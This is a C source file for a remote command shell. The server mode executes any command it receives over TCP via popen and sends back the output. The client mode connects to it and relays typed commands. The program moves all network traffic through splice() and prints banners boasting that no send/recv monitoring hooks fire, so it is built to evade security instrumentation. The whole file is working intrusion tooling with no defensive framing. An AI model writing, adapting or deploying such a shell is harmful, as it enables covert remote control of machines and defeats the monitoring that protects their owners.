#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define SPLICE_LEN  65536

static void run_server(int port)
{
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0) { perror("socket"); return; }

    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = INADDR_ANY,
        .sin_port = htons((uint16_t)port),
    };
    if (bind(lfd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind"); close(lfd); return;
    }
    listen(lfd, 4);
    printf("[server] listening on :%d (splice-based, no send/recv hooks fire)\n", port);

    for (;;) {
        int cfd = accept(lfd, NULL, NULL);
        if (cfd < 0) { perror("accept"); continue; }

        pid_t pid = fork();
        if (pid < 0) { close(cfd); continue; }
        if (pid > 0) { close(cfd); continue; }

        close(lfd);

        int recv_pipe[2], send_pipe[2];
        pipe(recv_pipe);
        pipe(send_pipe);

        char cmd[4096];
        for (;;) {
            splice(cfd, NULL, recv_pipe[1], NULL, SPLICE_LEN,
                   SPLICE_F_MOVE | SPLICE_F_MORE);

            ssize_t n = read(recv_pipe[0], cmd, sizeof(cmd)-1);
            if (n <= 0) break;
            cmd[n] = '\0';
            cmd[strcspn(cmd, "\r\n")] = '\0';
            if (strcmp(cmd, "exit") == 0) break;

            FILE *f = popen(cmd, "r");
            if (!f) {
                const char *err = "[!] popen failed\n";
                write(send_pipe[1], err, strlen(err));
            } else {
                char buf[4096];
                size_t r;
                while ((r = fread(buf, 1, sizeof(buf), f)) > 0)
                    write(send_pipe[1], buf, r);
                pclose(f);
            }

            close(send_pipe[1]);
            send_pipe[1] = -1;

            int tmp[2]; pipe(tmp);
            splice(send_pipe[0], NULL, cfd, NULL, SPLICE_LEN, SPLICE_F_MOVE);
            close(send_pipe[0]);

            pipe(send_pipe);
        }

        _exit(0);
    }
}

static void run_client(const char *ip, int port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return; }

    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)port),
    };
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) {
        fprintf(stderr, "[!] bad IP\n"); close(fd); return;
    }
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect"); close(fd); return;
    }

    printf("[client] connected to %s:%d via splice (no recv/send/sendmsg hooks)\n",
           ip, port);

    int s2p[2], p2s[2];
    pipe(s2p);
    pipe(p2s);

    char cmd[4096], out[65536];
    for (;;) {
        printf("splice> "); fflush(stdout);
        if (!fgets(cmd, sizeof(cmd), stdin)) break;

        write(p2s[1], cmd, strlen(cmd));
        splice(p2s[0], NULL, fd, NULL, strlen(cmd), SPLICE_F_MOVE | SPLICE_F_MORE);

        if (strncmp(cmd, "exit", 4) == 0) break;

        splice(fd, NULL, s2p[1], NULL, SPLICE_LEN, SPLICE_F_MOVE);
        ssize_t n = read(s2p[0], out, sizeof(out)-1);
        if (n <= 0) break;
        out[n] = '\0';
        fputs(out, stdout);
    }
    close(fd);
    close(s2p[0]); close(s2p[1]);
    close(p2s[0]); close(p2s[1]);
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <server|client>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "server") == 0) run_server(atoi(argv[2]));
    else if (strcmp(argv[1], "client") == 0 && argc >= 4) run_client(argv[2], atoi(argv[3]));
    else { fprintf(stderr, "unknown: %s\n", argv[1]); return 1; }

    return 0;
}
